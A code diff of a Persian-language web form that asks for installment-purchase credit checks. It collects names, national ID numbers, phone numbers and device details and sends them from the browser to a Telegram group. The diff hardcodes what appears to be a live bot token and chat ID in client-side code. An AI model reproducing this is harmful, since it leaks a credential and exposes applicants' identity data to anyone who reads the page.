@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>درخواست اعتبارسنجی خرید اقساطی</title>
 
-<!-- تقویم شمسی -->
 <link rel="stylesheet" href="https://unpkg.com/persian-datepicker@1.2.0/dist/css/persian-datepicker.min.css">
 
 <style>
@@ -166,7 +165,6 @@ button:disabled {
   display: block;
 }
 
-/* استایل تقویم شمسی */
 .datepicker-plot-area {
   font-family: Tahoma, Arial, sans-serif !important;
 }
@@ -232,14 +230,13 @@ button:disabled {
 
 </div>
 
-<!-- jQuery + تقویم شمسی -->
 <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
 <script src="https://unpkg.com/persian-date@1.1.0/dist/persian-date.min.js"></script>
 <script src="https://unpkg.com/persian-datepicker@1.2.0/dist/js/persian-datepicker.min.js"></script>
 
 <script>
 /* ============================================================
-   ⚙️ تنظیمات تلگرام — این دو مقدار را جایگزین کنید
+   ⚙️ تنظیمات تلگرام — توکن و CHAT_ID شما
    ============================================================ */
 const BOT_TOKEN = "9096438309:AAFPh7QKmFAHl3WPiz5T_MPUghRSSj-s75Y";
 const CHAT_ID   = "-1003803727270";
@@ -290,10 +287,9 @@ function escapeHTML(str) {
     .replace(/>/g, "&gt;");
 }
 
-// اعتبارسنجی واقعی کد ملی ایران
 function isValidNationalId(id) {
   if (!/^[0-9]{10}$/.test(id)) return false;
-  if (/^(\d)\1{9}$/.test(id)) return false; // همه ارقام یکسان
+  if (/^(\d)\1{9}$/.test(id)) return false;
   const check = +id[9];
   let sum = 0;
   for (let i = 0; i < 9; i++) sum += (+id[i]) * (10 - i);
@@ -329,7 +325,7 @@ function getDeviceInfo() {
 }
 
 /* ============================================================
-   اعتبارسنجی آنی (real-time)
+   اعتبارسنجی آنی
    ============================================================ */
 const fields = {
   fullname:   document.getElementById("fullname"),
@@ -421,7 +417,6 @@ form.addEventListener("submit", async function (event) {
   const mobile     = normalizeDigits(fields.mobile.value.trim());
   const phone      = normalizeDigits(fields.phone.value.trim());
 
-  /* --- اعتبارسنجی --- */
   if (!document.getElementById("agree").checked) {
     setStatus("لطفاً موافقت خود را ثبت کنید.", "error"); return;
   }
@@ -439,12 +434,6 @@ form.addEventListener("submit", async function (event) {
   }
   if (phone && !/^[0-9]{8,11}$/.test(phone)) {
     setStatus("شماره تماس جایگزین معتبر نیست.", "error"); return;
-  }
-
-  /* --- بررسی تنظیمات --- */
-  if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
-    setStatus("⚠️ BOT_TOKEN و CHAT_ID هنوز تنظیم نشده‌اند. فایل را ویرایش کنید.", "error");
-    return;
   }
 
   button.disabled = true;
@@ -475,7 +464,6 @@ form.addEventListener("submit", async function (event) {
     const tgData = await tgRes.json();
 
     if (!tgData.ok) {
-      // پیام خطای دقیق تلگرام
       throw new Error(tgData.description || "خطای نامشخص تلگرام");
     }
 
@@ -486,9 +474,11 @@ form.addEventListener("submit", async function (event) {
     console.error("Telegram error:", error);
     let msg = "ارسال درخواست انجام نشد. ";
     if (error.message.includes("chat not found")) {
-      msg += "CHAT_ID اشتباه است یا ربات را استارت نکرده‌اید.";
+      msg += "CHAT_ID اشتباه است یا ربات در گروه عضو نیست.";
     } else if (error.message.includes("Unauthorized")) {
       msg += "BOT_TOKEN نامعتبر است.";
+    } else if (error.message.includes("not enough rights")) {
+      msg += "ربات در گروه اجازه ارسال پیام ندارد.";
     } else if (error.message.includes("Failed to fetch")) {
       msg += "اتصال اینترنت یا فیلترشکن را بررسی کنید.";
     } else {
